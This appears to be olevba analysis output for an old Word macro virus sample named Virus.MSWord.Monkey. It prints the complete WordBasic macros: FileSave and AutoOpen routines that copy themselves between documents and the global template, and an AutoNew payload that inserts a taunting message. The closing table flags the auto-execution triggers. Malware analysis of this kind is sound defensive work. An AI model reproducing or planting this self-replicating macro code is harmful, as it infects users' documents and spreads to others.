olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Monkey
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Monkey - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Monkey - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "保存活动文档或模板"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
WordBasic.FileSave
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
WordBasic.MacroCopy "AutoNew", WordBasic.[FileName$]() + ":AutoNew"
WordBasic.MacroCopy "FileSave", WordBasic.[FileName$]() + ":FileSave"
WordBasic.MacroCopy "AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "AutoSave", WordBasic.[FileName$]() + ":AutoSave"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoSave.bas 
in file: Virus.MSWord.Monkey - OLE stream: 'Macros/VBA/AutoSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.SetDocumentVar "Saved", "Ok"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Monkey - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If WordBasic.[MacroFileName$]("AutoOpen") = WordBasic.[FileName$]() _
  And WordBasic.[MacroFileName$]("FileSave") = WordBasic.[FileName$]() _
  And WordBasic.[MacroFileName$]("AutoNew") = WordBasic.[FileName$]() _
  And WordBasic.[MacroFileName$]("AutoSave") = WordBasic.[FileName$]() _
Then
  WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "AutoOpen"
  WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSave", "FileSave"
  WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "AutoNew"
  WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoSave", "AutoSave"
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Monkey - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.Insert " A monkey has controlled your Word!!!"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

